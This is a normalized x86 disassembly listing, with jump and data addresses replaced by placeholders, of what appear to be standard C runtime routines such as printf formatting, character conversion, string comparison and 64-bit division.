add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea edi [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ ebx - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x228 ] ebx
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_41a7eb
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
mov [ ebp - 0x264 ] ebx
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov edi [ ebp - 0x258 ]
mov ecx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_41f85a
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ ebx ]
mov esi [ DecodePointer@IAT ]
add ebx 0x8
mov [ ebp - 0x278 ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x228 ] ebx
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x210 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
call sub_428646
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov ebx [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_41f827
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ ebx - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ ebx - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_4287b1
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
add eax 0x2
push [ ebp - 0x21c ]
lea eax [ ebp - 0x224 ]
mov ecx ebx
call sub_41f85a
pop ecx
test ebx ebx
jle r-xdata
jmp r-xdata
test edi edi
jg r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_41c229
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
test ebx ebx
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc edi
mov [ ebp - 0x21c ] edi
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_427060
add ecx 0x30
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov ebx [ ebp - 0x264 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x270 ]
test ecx ecx
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
mov al 0x30
dec ebx
call sub_41f827
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_41d120
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x260 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
test ebx ebx
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_41f85a
pop ecx
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
mov al 0x20
dec ebx
call sub_41f827
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
push eax
dec ebx
add esi 0x2
call sub_4287b1
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_4293f0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_42941d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_41b9dc
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_41c34a
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_4287ce
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_423b1c
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41bc4a
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_429532
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42941d
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_42955e
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_41b9dc
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42b114
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_42a672
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
sub_429606
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_41b9dc
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42b114
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_42abc3
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
sub_4296ae
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_41c34a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_41efd5
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_41d120
inc eax
push eax
push edi
push esi
call sub_41a460
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_429761
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_429814
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_429761
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_42b7f0
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_41e063
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41ef83
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
sub_4298b0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_429990
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_4299b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_42c216
call sub_42c216
mov [ esi ] eax
jmp r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
call sub_41efd5
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_42c216
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_429a17
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_428620
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_42c528
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_428620
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
push esi
call sub_428620
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_428620
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_428620
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_428620
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_428620
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_428620
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_428620
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_428620
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4287b1
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_428620
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_428620
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_41f6c3
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_429b9e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_4287ce
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_41c34a
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_429cce
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_429d40
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_429d6b
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_429da4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_429d6b
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
